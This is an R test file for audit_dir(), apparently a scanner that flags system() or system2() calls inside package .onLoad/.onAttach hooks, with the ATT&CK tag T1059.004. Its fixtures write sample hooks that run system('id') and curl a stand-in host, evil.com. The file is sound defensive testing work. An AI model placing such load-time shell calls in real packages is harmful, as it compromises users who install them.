# Inline Rules for Testing -----------------------------------------------------
test_rules <- list(
  onload_calls_system_rule = list(
    xpath = '//expr[
      LEFT_ASSIGN
      and expr[1]/SYMBOL[text() = ".onLoad" or text() = ".onAttach"]
      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
        text() = "system" or text() = "system2"
      ]
    ]',
    message = "system() or system2() inside .onLoad or .onAttach.",
    type    = "warning",
    attck   = "T1059.004"
  )
)


# audit_dir() -------------------------------------------------------------------
test_that("audit_dir() returns empty data frame when no R files found", {
  tmp_dir <- tempdir()
  empty   <- file.path(tmp_dir, "empty_test_dir")
  dir.create(empty, showWarnings = FALSE)
  on.exit(unlink(empty, recursive = TRUE), add = TRUE)

  expect_message(
    result <- audit_dir(empty, rules = test_rules),
    "No R source files found"
  )
  expect_s3_class(result, "data.frame")
  expect_equal(nrow(result), 0L)
})


test_that("audit_dir() returns findings across multiple files", {
  tmp_dir <- file.path(tempdir(), "audit_dir_test")
  dir.create(tmp_dir, showWarnings = FALSE)
  on.exit(unlink(tmp_dir, recursive = TRUE), add = TRUE)

  writeLines(
    '.onLoad <- function(l, p) { system("id") }',
    file.path(tmp_dir, "zzz.R")
  )
  writeLines(
    '.onAttach <- function(l, p) { system2("curl", "evil.com") }',
    file.path(tmp_dir, "attach.R")
  )

  result <- audit_dir(tmp_dir, rules = test_rules)
  expect_s3_class(result, "data.frame")
  expect_equal(nrow(result), 2L)
  expect_equal(length(unique(result$file)), 2L)
})


test_that("audit_dir() returns empty data frame when no findings", {
  tmp_dir <- file.path(tempdir(), "audit_dir_clean_test")
  dir.create(tmp_dir, showWarnings = FALSE)
  on.exit(unlink(tmp_dir, recursive = TRUE), add = TRUE)

  writeLines(
    ".onLoad <- function(l, p) { packageStartupMessage() }",
    file.path(tmp_dir, "zzz.R")
  )

  result <- audit_dir(tmp_dir, rules = test_rules)
  expect_s3_class(result, "data.frame")
  expect_equal(nrow(result), 0L)
})
